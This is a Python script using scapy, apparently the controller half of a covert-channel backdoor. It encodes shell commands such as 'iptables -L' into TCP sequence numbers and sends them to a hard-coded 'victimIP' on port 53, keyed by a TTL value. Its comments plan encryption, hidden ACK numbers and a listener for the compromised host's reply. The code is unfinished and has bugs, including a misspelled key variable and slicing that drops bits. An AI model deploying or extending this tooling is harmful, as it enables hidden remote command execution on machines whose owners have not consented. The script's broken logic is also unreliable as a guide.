from scapy.all import *


#Inputs
victimIP = "192.168.0.1"
ttlKey = 71
srcPort = 80
dstPort = 53
encryptionkey = "0123456789abcdef"
IV = "abcdefghijklmnop"
protocol = "TCP"


def packetizeCommandData(command):
    commandData = ''.join(str(ord(c)) for c in command)
    print commandData
    #convert string to binary
    commandData = bin(int(commandData))[2:]
    #TODO: ENCRYPT THE COMMAND HERE. Ensure that the command stays in numbers

    print commandData

    #Check the length of the data. If it is > 32 bits (TCP seq num field)
    #Will need to split into multiple packets
    print str(len(commandData))
    #If it is the proper length, perfect, merely send it back out.
    if(len(commandData) == 32 ):
        output = []
        output.append(commandData)
        return commandData
    #If command is < 32, pad it with 0's
    elif(len(commandData) < 32):
        #If the length of the data is less than 32, pad it so that it will fit into a packet
        return commandData.zfill(32)
    elif(len(commandData) > 32):
        #The amount of rounds we should chunk the data.
        rounds = len(commandData) / 32
        #What will be left over after we chunk the 32 bit chunks
        excess = len(commandData) % 32
        print "Rounds is " + str(rounds)
        output = []
        i = 0
        start = 0
        end = 0
        while(i < rounds):
            print "This is round" + str(i)
            start = i*32
            end = (i*32)+31
            output.append(commandData[start:end])
            i = i + 1
        #Get the remainder
        output.append(commandData[(end+1):(end+1+excess)])
        return output


def craftCommandPacket(data):
    global victimIP
    global ttlKey
    global srcPort
    global dstPort
    global encryptionKey
    global IV

    packet = IP(dst=victimIP, ttl=ttlKey)/TCP(sport=srcPort,dport=dstPort,seq=int(str(data),2))
    #packet.show()
    return packet

def craftCommandPackets(data):
    packets = []
    #If the length of the number is larger than what is allowed in one packet, split it
    for element in data:
        packets.append(craftCommandPacket(element))
        pass
    return packets





def sendCommand(protocol,command):
    global victimIP
    global ttlKey
    global srcPort
    global dstPort
    global encryptionKey
    global IV
    if(protocol == "TCP"):
    #Construct a TCP packet, put the command into the sequence number
        #Custom Protocol (Incase we have long commands)
            #TCP: Sequence Number = Data
                #Convert string to ASCII
        print packetizeCommandData(command)
        binaryDataArray = packetizeCommandData(command)
        packets = craftCommandPackets(binaryDataArray)
            #TCP: ACK Number = Sequence number (0 means only one part to the command)
            #So if there is more than one packet, add Increment the Ack number by 1
        counter = 0
        while (counter < len(packets)):
            packet = packets[counter]
            #TODO: Make this Ack Number more hidden than just "Plaintext 1"
            packet["TCP"].ack = (counter + 1)
            counter = counter + 1
        #TCP: Data = Authentication Password
        #TODO: Do this

    #Send the command packets
    for packet in packets:
        send(packet)
        pass

#1. Send a command packet
command = "iptables -L"
sendCommand("TCP",command)



#2. Listen for a response connection that will show what port to connect on.
    #"Okay, lets talk. You can communicate with me via TCP on port"
